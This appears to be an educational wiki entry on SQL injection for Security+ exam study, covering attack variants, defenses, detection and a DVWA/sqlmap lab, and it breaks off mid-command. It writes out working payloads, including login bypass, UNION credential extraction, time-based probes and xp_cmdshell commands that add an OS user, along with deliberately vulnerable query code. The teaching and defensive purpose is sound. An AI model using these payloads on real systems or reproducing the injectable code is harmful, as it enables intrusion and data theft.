---
domain: "application security"
tags: [injection, web-security, owasp, database, attack, vulnerability]
---
# SQL Injection (SQLi)

**SQL Injection (SQLi)** is a [[Web Application Attack]] technique in which an attacker inserts or "injects" malicious **SQL code** into an input field or query parameter, manipulating the backend [[Database]] query to return unauthorized data, bypass authentication, or execute administrative operations. It consistently ranks as the #1 or #2 vulnerability in the [[OWASP Top 10]] and has been responsible for some of the most significant data breaches in history. SQLi exploits the failure to properly separate **data from code** in database-backed applications.

---

## Overview

SQL Injection exists because web applications dynamically construct SQL queries by concatenating user-supplied input directly into query strings. When a developer writes `"SELECT * FROM users WHERE username = '" + userInput + "'"`, they assume the input will be a benign string like `alice`. An attacker, however, can supply `alice' OR '1'='1`, fundamentally changing the query's logic. The database engine cannot distinguish between the developer's intended SQL and the attacker's injected SQL — it simply executes whatever valid SQL it receives.

The vulnerability is deceptively simple in concept yet devastating in impact. A successful SQLi attack can grant read access to every table in a database, allow modification or deletion of records, enable authentication bypass, and in some configurations allow the attacker to read and write files on the operating system or execute OS-level commands. The MySQL `LOAD_FILE()` and `INTO OUTFILE` functions, or SQL Server's `xp_cmdshell` stored procedure, are classic examples of how database features can be weaponized once injection is achieved.

SQLi has been exploited in landmark breaches including the 2009 Heartland Payment Systems breach (134 million credit cards), the 2011 Sony PlayStation Network breach (~77 million accounts), and the 2015 TalkTalk breach. The attack vector remains prevalent not because it is technically sophisticated, but because legacy codebases, frameworks with ORM misuse, and poorly trained developers continue to produce injectable code. Modern web application firewalls and parameterized query support in every major language have not eliminated the problem — they have only moved the frontier.

There are multiple distinct variants of SQLi, each requiring different exploitation techniques and presenting different detection challenges. **In-band** SQLi returns results directly through the same HTTP channel used to inject the query. **Blind** SQLi provides no direct output but allows inference through boolean logic or time delays. **Out-of-band** SQLi exfiltrates data through a secondary channel such as DNS or HTTP requests triggered by database functions. Understanding these distinctions is critical for both attackers and defenders.

---

## How It Works

### The Vulnerable Query

Consider a login form at `http://example.com/login`. The backend PHP code might look like:

```php
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "' AND password = '" . $_POST['password'] . "'";
$result = mysqli_query($conn, $query);
if (mysqli_num_rows($result) > 0) {
    // login successful
}
```

### Step 1: Identify the Injection Point

An attacker submits a single quote `'` into the username field. If the application returns a database error like `You have an error in your SQL syntax`, the field is injectable. Useful test payloads:

```
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
```

### Step 2: Authentication Bypass (Classic In-Band)

The attacker submits:
- **Username:** `admin'--`
- **Password:** (anything)

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
```

The `--` is a SQL comment character (also `#` in MySQL). Everything after it is ignored, including the password check. The query effectively becomes `SELECT * FROM users WHERE username = 'admin'`, logging in as admin without knowing the password.

### Step 3: UNION-Based Data Extraction

Once injection is confirmed, UNION attacks allow retrieval of data from other tables. The attacker must first determine the number of columns returned by the original query:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- error here means 2 columns
```

Then craft a UNION query:

```sql
' UNION SELECT username, password FROM users--
```

Full URL-encoded example against a product page:

```
http://example.com/item?id=1' UNION SELECT username,password FROM users--
```

### Step 4: Blind Boolean-Based SQLi

When no data is returned directly, attackers infer information through true/false conditions:

```sql
' AND 1=1--    -- page loads normally (TRUE)
' AND 1=2--    -- page changes or errors (FALSE)

' AND SUBSTRING(username,1,1)='a'--   -- is first char of username 'a'?
```

This allows extraction of any data one character at a time.

### Step 5: Time-Based Blind SQLi

When even boolean differences aren't visible, time delays confirm injection:

```sql
-- MySQL
' AND SLEEP(5)--

-- SQL Server
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
```

If the response is delayed by 5 seconds, the injection is successful.

### Step 6: OS Command Execution (SQL Server)

On Microsoft SQL Server with `xp_cmdshell` enabled:

```sql
'; EXEC xp_cmdshell('whoami')--
'; EXEC xp_cmdshell('net user hacker P@ssw0rd /add')--
```

### Common Ports and Protocols

| Database | Default Port | Protocol |
|---|---|---|
| MySQL/MariaDB | 3306 | TCP |
| PostgreSQL | 5432 | TCP |
| Microsoft SQL Server | 1433 | TCP |
| Oracle | 1521 | TCP |
| SQLite | N/A (file-based) | — |

SQLi itself travels over HTTP (port 80) or HTTPS (port 443) as part of normal web traffic, making network-layer detection difficult.

---

## Key Concepts

- **Injection Point**: Any location where user-supplied data is incorporated into a SQL query without sanitization — form fields, URL parameters, HTTP headers (`User-Agent`, `X-Forwarded-For`, `Cookie`), and JSON/XML request bodies are all potential injection points.

- **Tautology Attack**: An injection that creates a condition that is always true, such as `' OR '1'='1'--`, used to bypass WHERE clauses and return all rows or bypass authentication logic.

- **UNION Attack**: A technique that appends an additional SELECT statement to the original query using the SQL `UNION` operator, allowing data from arbitrary tables to be retrieved in the same result set; requires matching column count and compatible data types.

- **Blind SQLi**: A class of SQLi where the application does not return query results directly in the HTTP response; attackers must infer data through boolean responses (different page content or status codes) or time-based delays (using `SLEEP()` or `WAITFOR DELAY`).

- **Second-Order (Stored) SQLi**: An injection where malicious input is stored in the database and later incorporated into a SQL query in a different application context, bypassing input validation that only checks data at the point of entry rather than at the point of use.

- **Out-of-Band SQLi**: Exfiltration of data through a channel other than the HTTP response, typically DNS lookups or HTTP requests triggered by database functions like SQL Server's `xp_dirtree` or Oracle's `UTL_HTTP`, used when in-band and blind techniques are too slow or blocked.

- **Error-Based SQLi**: A technique that deliberately causes the database to generate error messages containing data values, often exploiting functions like MySQL's `extractvalue()` or `updatexml()` to embed query results within the error text.

- **Parameterized Queries (Prepared Statements)**: The primary defense against SQLi; the query structure is compiled first with placeholders (`?` or named parameters), and user data is passed separately so the database engine never interprets it as SQL syntax regardless of content.

---

## Exam Relevance

**SY0-701 Exam Tips:**

- **SQLi is categorized under Injection attacks** in the Security+ exam framework, specifically within the context of application vulnerabilities and attack types. Expect it in Domain 2 (Threats, Vulnerabilities, and Mitigations).

- **Common question pattern**: "A user enters `' OR '1'='1` into a login field and gains access. What type of attack is this?" — Answer: **SQL Injection** (specifically a **tautology** or **authentication bypass**).

- **Distinguishing attack types**: The exam may ask you to differentiate SQLi from [[Cross-Site Scripting (XSS)]] (XSS targets the browser/client; SQLi targets the database/server), [[Command Injection]] (OS commands vs. SQL commands), and [[LDAP Injection]] (same concept applied to directory services).

- **Defensive pairing**: The Security+ exam strongly associates SQLi defense with **parameterized queries/prepared statements** as the primary control, **input validation** as a secondary control, and **WAF (Web Application Firewall)** as a detective/preventive control. Know all three.

- **OWASP Top 10 context**: SQLi falls under **A03:2021 – Injection**. The exam references OWASP frameworks; know that injection broadly includes SQLi, command injection, and LDAP injection.

- **Gotcha**: The exam may present "stored procedures" as a defense — this is a **partial truth**. Stored procedures are only safe if they themselves use parameterized queries internally; a stored procedure that concatenates strings is still vulnerable.

- **Gotcha**: Input validation/sanitization alone is **not sufficient** as the primary defense — parameterized queries are the correct answer. Blacklisting SQL keywords can be bypassed (e.g., `SeLeCt`, URL encoding, comments `/**/`).

---

## Security Implications

### Attack Surface

SQLi can be delivered through virtually any data input channel that reaches a SQL query: HTML form fields, URL query parameters (`?id=1`), HTTP headers, cookies, JSON API bodies, XML parameters, and even filenames in file upload features. The ubiquity of the attack surface combined with the high-value target (databases containing PII, credentials, financial data) makes SQLi one of the highest-severity web vulnerabilities.

### Real-World CVEs and Incidents

| Incident/CVE | Year | Impact |
|---|---|---|
| CVE-2012-1823 (PHP-CGI) | 2012 | Remote code execution via query string |
| CVE-2019-19781 (Citrix ADC) | 2019 | Unauthenticated SQLi leading to RCE |
| Heartland Payment Systems | 2009 | 134M card numbers stolen, $140M in fines |
| Sony PSN Breach | 2011 | 77M accounts, $171M estimated damages |
| TalkTalk Breach | 2015 | 157K customers, £400K ICO fine |
| Drupal "Drupalgeddon" (CVE-2014-3704) | 2014 | Mass exploitation within hours of disclosure |

### Detection Indicators

- Anomalous database error messages in HTTP responses (`ORA-00933`, `MySQL server version`, `Incorrect syntax near`)
- URL parameters containing SQL keywords: `UNION`, `SELECT`, `DROP`, `INSERT`, `'`, `--`, `%27`
- Unusual query times or database load spikes (time-based blind SQLi)
- WAF alerts triggering on SQL syntax patterns
- Database audit logs showing unexpected `DROP`, `UPDATE`, or cross-table queries from the web application's service account

---

## Defensive Measures

### Primary Controls

**1. Parameterized Queries / Prepared Statements**

The definitive fix. Use in every language:

```python
# Python - Safe
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))

# Python - Vulnerable (NEVER do this)
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
```

```java
// Java - Safe
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ? AND password = ?");
stmt.setString(1, username);
stmt.setString(2, password);
```

```php
// PHP PDO - Safe
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :user AND password = :pass");
$stmt->execute(['user' => $username, 'pass' => $password]);
```

**2. Stored Procedures (with caution)**

Use parameterized stored procedures:

```sql
-- SQL Server safe stored procedure
CREATE PROCEDURE GetUser @username NVARCHAR(50)
AS
    SELECT * FROM users WHERE username = @username
```

**3. ORM Usage**

ORMs like SQLAlchemy, Hibernate, and Django ORM use parameterized queries by default. Avoid raw query methods (`raw()`, `execute()`) unless necessary.

### Secondary Controls

**4. Input Validation**

Validate type, length, format, and range. Use allowlists (not blocklists):

```python
import re
if not re.match(r'^[a-zA-Z0-9_]{3,32}$', username):
    raise ValueError("Invalid username format")
```

**5. Principle of Least Privilege (Database)**

The web application's database user should have **only the permissions it needs**:

```sql
-- Grant only necessary permissions
GRANT SELECT, INSERT ON app_schema.orders TO 'webapp_user'@'localhost';
-- Never use root/sa for application connections
```

**6. Web Application Firewall (WAF)**

Deploy a WAF with SQLi rulesets:

- **ModSecurity** with OWASP Core Rule Set (CRS): `SecRule ARGS "@detectSQLi" "id:942100,phase:2,deny,status:403"`
- **AWS WAF**, **Cloudflare WAF**, **Azure WAF** all include managed SQLi rule groups
- **Snort/Suricata** IDS signatures for SQL keyword patterns in HTTP traffic

**7. Error Handling**

Suppress database error messages in production responses. Configure generic error pages:

```php
// Suppress detailed errors in production
ini_set('display_errors', 0);
error_reporting(0);
// Log to file, not to screen
ini_set('log_errors', 1);
```

**8. Static Application Security Testing (SAST) and DAST**

- **SAST**: Integrate tools like **Semgrep**, **SonarQube**, or **Checkmarx** in the CI/CD pipeline to catch injectable string concatenation before deployment.
- **DAST**: Run **OWASP ZAP** or **Burp Suite Pro** against staging environments to detect SQLi automatically.

---

## Lab / Hands-On

### Lab Environment Setup

**Option 1: DVWA (Damn Vulnerable Web Application)**

```bash
# Using Docker
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 vulnerables/web-dvwa

# Access at http://localhost/dvwa
# Default credentials: admin / password
# Set security level to LOW in DVWA Security settings
```

**Option 2: WebGoat (OWASP)**

```bash
docker pull webgoat/goat-and-wolf
docker run -p 8080:8080 -p 9090:9090 webgoat/goat-and-wolf
# Access at http://localhost:8080/WebGoat
```

### Exercise 1: Manual SQLi in DVWA

Navigate to DVWA → SQL Injection. Test the User ID field:

```sql
-- Test for injection
1'

-- Always-true bypass
1' OR '1'='1

-- UNION to extract database version
1' UNION SELECT null, version()--

-- Extract all usernames and passwords
1' UNION SELECT user, password FROM users--
```

### Exercise 2: sqlmap Automation

`sqlmap` is the industry-standard automated SQLi tool:

```bash
# Install
pip install sqlmap
# or: apt install sqlmap

# Basic detection
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=yourtoken; security